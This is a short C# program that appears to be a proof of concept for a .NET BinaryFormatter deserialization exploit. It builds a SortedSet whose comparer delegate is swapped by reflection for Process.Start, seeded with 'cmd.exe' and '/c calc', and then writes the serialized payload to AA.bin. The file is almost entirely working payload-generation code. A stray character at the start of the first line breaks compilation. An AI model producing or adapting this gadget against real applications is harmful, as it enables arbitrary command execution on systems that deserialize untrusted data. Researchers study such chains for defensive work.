iusing System;
using System.Collections.Generic;

using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization.Formatters.Binary;

namespace SortedSetExample
{
    class Program
    {
        static void Main(string[] args)
        {


            Delegate da = new Comparison<string>(String.Compare);
            //Delegate db = new Func<string, string, Process>(Process.Start);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);

            SortedSet<string> sortedSet = new SortedSet<string>(Comparer<string>.Create(d));

            sortedSet.Add("/c calc");
            sortedSet.Add("cmd.exe");

            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();

            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(d, invoke_list);

            BinaryFormatter formatter = new BinaryFormatter();
            using (FileStream stream = new FileStream("AA.bin", FileMode.Create, FileAccess.Write, FileShare.None))
            {
                formatter.Serialize(stream, sortedSet);
            }


        }
    }
}
